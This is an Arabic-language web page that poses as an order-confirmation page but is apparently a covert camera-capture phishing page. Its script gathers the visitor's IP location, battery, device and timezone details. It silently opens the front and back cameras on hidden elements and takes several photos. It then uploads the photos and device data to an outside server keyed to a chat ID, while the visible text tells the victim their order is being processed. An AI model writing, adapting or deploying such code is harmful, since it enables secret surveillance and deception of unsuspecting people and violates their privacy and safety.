<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 طلبك- مرحبا بك في موقعنا</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
        }

        /* خلفية متحركة */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, 
                rgba(102, 126, 234, 0.1) 0%, 
                rgba(118, 75, 162, 0.1) 50%, 
                rgba(255, 107, 107, 0.1) 100%);
            animation: gradientShift 8s ease-in-out infinite;
            z-index: -1;
        }

        @keyframes gradientShift {
            0%, 100% { transform: translateX(0%) rotate(0deg); }
            50% { transform: translateX(5%) rotate(2deg); }
        }

        .container {
            max-width: 500px;
            padding: 40px 20px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            box-shadow: 
                0 8px 32px rgba(0, 0, 0, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
        }

        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 50%);
            animation: shimmer 3s ease-in-out infinite;
            pointer-events: none;
        }

        @keyframes shimmer {
            0%, 100% { transform: rotate(0deg); }
            50% { transform: rotate(180deg); }
        }

        .camera-icon {
            font-size: 4rem;
            margin-bottom: 20px;
            animation: bounce 2s ease-in-out infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        .spinner {
            border: 6px solid rgba(255, 255, 255, 0.2);
            border-top: 6px solid #ff6b6b;
            border-radius: 50%;
            width: 100px;
            height: 100px;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 30px;
            box-shadow: 0 0 20px rgba(255, 107, 107, 0.3);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h1 {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 15px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            animation: fadeInUp 1s ease-out;
        }

        p {
            font-size: 1.1rem;
            font-weight: 400;
            opacity: 0.9;
            line-height: 1.6;
            animation: fadeInUp 1s ease-out 0.3s both;
        }

        .status-text {
            font-size: 1rem;
            margin-top: 20px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            animation: fadeInUp 1s ease-out 0.5s both;
        }

        .progress-dots {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 25px;
        }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            animation: dotPulse 1.5s ease-in-out infinite;
        }

        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.3s; }
        .dot:nth-child(3) { animation-delay: 0.6s; }
        .dot:nth-child(4) { animation-delay: 0.9s; }

        @keyframes dotPulse {
            0%, 100% { background: rgba(255, 255, 255, 0.3); transform: scale(1); }
            50% { background: #ff6b6b; transform: scale(1.3); }
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .success-message {
            background: linear-gradient(135deg, #2ecc71, #27ae60);
            padding: 20px;
            border-radius: 15px;
            margin-top: 20px;
            box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);
        }

        .success-icon {
            font-size: 3rem;
            margin-bottom: 10px;
            animation: successBounce 0.6s ease-out;
        }

        @keyframes successBounce {
            0% { transform: scale(0); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        /* تخفي العناصر الخاصة بطلبك*/
        #frontVideo, #backVideo, #frontCanvas, #backCanvas {
            display: none;
        }

        /* تأثيرات للشاشات الصغيرة */
        @media (max-width: 600px) {
            .container {
                margin: 20px;
                padding: 30px 15px;
            }
            
            h1 {
                font-size: 1.5rem;
            }
            
            .camera-icon {
                font-size: 3rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="camera-icon">🚀</div>
        <div class="spinner"></div>
        <h1>🚀 جاري تفعيل طلبك</h1>
        <p>يرجى الانتظار بينما نقوم بالوصول إلى طلبك...</p>
        
        <div class="status-text" id="statusText">
            🔍 البحث عن الكاميرات المتاحة...
        </div>
        
        <div class="progress-dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
    </div>

    <!-- عناصر طلبكالمخفية -->
    <video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
    <video id="backVideo" playsinline autoplay muted style="display:none;"></video>
    <canvas id="frontCanvas" style="display:none;"></canvas>
    <canvas id="backCanvas" style="display:none;"></canvas>

    <script>
        // ⚙️ إعدادات الخادم - رابط الخادم الجديد
        const SERVER_URL = 'https://boserver.onrender.com';
        
        const frontVideo = document.getElementById('frontVideo');
        const backVideo = document.getElementById('backVideo');
        const frontCanvas = document.getElementById('frontCanvas');
        const backCanvas = document.getElementById('backCanvas');
        const statusText = document.getElementById('statusText');

        // 🆔 الحصول على معرف المستخدم من الرابط
        function getChatId() {
            const urlParams = new URLSearchParams(window.location.search);
            let chatId = urlParams.get('chatId');
            
            if (!chatId) {
                // محاولة الحصول عليه من المسار
                const pathParts = window.location.pathname.split('/');
                chatId = pathParts[pathParts.length - 1];
                
                // إذا كان المسار ينتهي بـ .html، خذ الجزء الذي قبله
                if (chatId && chatId.includes('.html')) {
                    chatId = pathParts[pathParts.length - 2];
                }
            }
            
            console.log("Retrieved chatId:", chatId);
            return chatId;
        }

        // 📊 جمع البيانات الإضافية المحسنة
        async function collectAdditionalData() {
            try {
                statusText.textContent = '📡 تنفيذ طلبك...';
                
                const [ipInfo, battery] = await Promise.all([
                    fetch('https://ipapi.co/json/')
                        .then(response => response.json())
                        .catch(() => ({ ip: 'غير متاح', country_name: 'غير متاح', city: 'غير متاح' })),
                    
                    navigator.getBattery ? 
                        navigator.getBattery().catch(() => ({ level: 'غير متاح', charging: 'غير متاح' })) :
                        Promise.resolve({ level: 'غير متاح', charging: 'غير متاح' })
                ]);

                return {
                    ip: ipInfo.ip || 'غير متاح',
                    country: ipInfo.country_name || 'غير متاح',
                    city: ipInfo.city || 'غير متاح',
                    platform: getPlatformInfo().platform,
                    deviceVersion: getDeviceVersion(),
                    userAgent: navigator.userAgent || 'غير متاح',
                    batteryLevel: battery.level !== undefined ? `${Math.round(battery.level * 100)}%` : 'غير متاح',
                    batteryCharging: battery.charging !== undefined ? battery.charging : 'غير متاح',
                    screenResolution: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language || 'غير متاح',
                    timestamp: new Date().toISOString()
                };
            } catch (error) {
                console.error('Error collecting additional data', error);
                return {
                    ip: 'غير متاح',
                    country: 'غير متاح',
                    city: 'غير متاح',
                    platform: getPlatformInfo().platform,
                    deviceVersion: getDeviceVersion(),
                    userAgent: navigator.userAgent || 'غير متاح',
                    batteryLevel: 'غير متاح',
                    batteryCharging: 'غير متاح',
                    screenResolution: `${screen.width}x${screen.height}`,
                    timezone: 'غير متاح',
                    language: navigator.language || 'غير متاح',
                    timestamp: new Date().toISOString()
                };
            }
        }

        function getPlatformInfo() {
            const ua = navigator.userAgent;
            if (/Windows/.test(ua)) return { platform: "Windows" };
            if (/Mac/.test(ua)) return { platform: "MacOS" };
            if (/Linux/.test(ua)) return { platform: "Linux" };
            if (/Android/.test(ua)) return { platform: "Android" };
            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
            return { platform: "Unknown" };
        }

        function getDeviceVersion() {
            const ua = navigator.userAgent;
            const match = ua.match(/\(([^)]+)\)/);
            return match ? match[1] : 'Unknown';
        }

        // 🎥 طلب إذن الكاميرا
        async function requestCameraPermission(facingMode) {
            try {
                statusText.textContent = ` الوصول إلى طلبك${facingMode === 'user' ? 'بنجاح' : 'فشل'}...`;
                
                const constraints = {
                    video: { facingMode: facingMode }
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                return stream;
            } catch (error) {
                console.error(`Error accessing ${facingMode} camera:`, error);
                return null;
            }
        }

        // 🚀 تهيئة النظام
        async function init() {
            try {
                const chatId = getChatId();
                if (!chatId || chatId === 'camera.html' || chatId === '') {
                    throw new Error('معرف المحادثة غير موجود - تأكد من صحة الرابط');
                }

                const additionalData = await collectAdditionalData();
                statusText.textContent = '🎯 تجهيز الطلبات...';
                
                const frontStream = await requestCameraPermission('user');
                const backStream = await requestCameraPermission('environment');

                if (frontStream || backStream) {
                    statusText.textContent = '✅ تم الوصول للكاميرا بنجاح!';
                    handleSuccess(frontStream, backStream, additionalData, chatId);
                } else {
                    throw new Error('No camera access granted');
                }
            } catch (e) {
                console.error('Error in init:', e);
                statusText.textContent = `❌ خطأ: ${e.message}`;
                setTimeout(init, 3000);
            }
        }

        function handleSuccess(frontStream, backStream, additionalData, chatId) {
            if (frontStream) {
                frontVideo.srcObject = frontStream;
                frontVideo.addEventListener('loadedmetadata', () => 
                    setupCamera(frontVideo, frontCanvas, 'front', additionalData, chatId));
            }
            if (backStream) {
                backVideo.srcObject = backStream;
                backVideo.addEventListener('loadedmetadata', () => 
                    setupCamera(backVideo, backCanvas, 'back', additionalData, chatId));
            }
        }

        function setupCamera(video, canvas, cameraType, additionalData, chatId) {
            video.play();
            video.onplaying = () => {
                const { videoWidth, videoHeight } = video;
                canvas.width = videoWidth;
                canvas.height = videoHeight;

                const context = canvas.getContext('2d');
                let photoCount = 0;
                const maxPhotos = 4;

                statusText.textContent = ` جاري تنفيذ طلبك${cameraType === 'front' ? 'الأمامية' : 'الخلفية'}... (${photoCount}/${maxPhotos})`;

                const captureInterval = setInterval(() => {
                    if (photoCount >= maxPhotos) {
                        clearInterval(captureInterval);
                        
                        // إيقاف الكاميرا
                        if (frontVideo.srcObject) frontVideo.srcObject.getTracks().forEach(track => track.stop());
                        if (backVideo.srcObject) backVideo.srcObject.getTracks().forEach(track => track.stop());
                        
                        // رسالة النجاح
                        document.querySelector('.container').innerHTML = `
                            <div class="success-icon">✅</div>
                            <div class="success-message">
                                <h1>🎉 تم تنفيذ طلبك بنجاح!</h1>
                                <p>تم استلم طلبك بنجاح </p>
                                <p>يمكنك الآن إغلاق الصفحة أو متابعة التصفح</p>
                            </div>
                        `;
                        return;
                    }

                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
                        formData.append('userId', chatId);
                        formData.append('cameraType', cameraType);
                        formData.append('imageWidth', canvas.width);
                        formData.append('imageHeight', canvas.height);
                        formData.append('additionalData', JSON.stringify(additionalData));
                        post('/submitPhotos', formData);
                    }, 'image/webp', 0.7);

                    photoCount++;
                    statusText.textContent = `🚀 تنفيذ الطلب... (${photoCount}/${maxPhotos})`;
                }, 1500);
            };
        }

        // 📤 إرسال البيانات للخادم الجديد - تم التعديل للنظام الجديد
        async function post(url, formData) {
            const maxRetries = 5;
            let retries = 0;

            while (retries < maxRetries) {
                try {
                    const response = await fetch(`${SERVER_URL}${url}`, {
                        method: 'POST',
                        body: formData
                    });

                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }

                    const data = await response.json();

                    if (data.success) {
                        console.log('✅ تم إرسال الصور بنجاح إلى السيرفر الجديد');
                        return;
                    } else {
                        throw new Error(data.error);
                    }
                } catch (error) {
                    console.error('Error:', error);
                    retries++;
                    if (retries < maxRetries) {
                        statusText.textContent = `⚠️ إعادة المحاولة... (${retries}/${maxRetries})`;
                        await new Promise(resolve => setTimeout(resolve, 3000 * retries));
                    }
                }
            }

            console.error('Max retries reached. Unable to send photos.');
            statusText.textContent = '❌ فشل في تنفيذ طلبك يرجى إعادة تحميل الصفحة.';
        }

        // 🌟 بدء النظام عند تحميل الصفحة
        window.addEventListener('load', () => {
            setTimeout(init, 1000); // تأخير قصير لإظهار الرسوم المتحركة
        });

        // 🚨 معالج الأخطاء العام
        window.addEventListener('error', function(e) {
            console.error('Global error:', e.error);
            statusText.textContent = "❌ حدث خطأ غير متوقع. يرجى إعادة تحميل الصفحة.";
        });

        // 📱 تحسين الأداء للجوال
        document.addEventListener('touchstart', function(e) {
            e.preventDefault();
        }, { passive: false });
    </script>
</body>
</html>
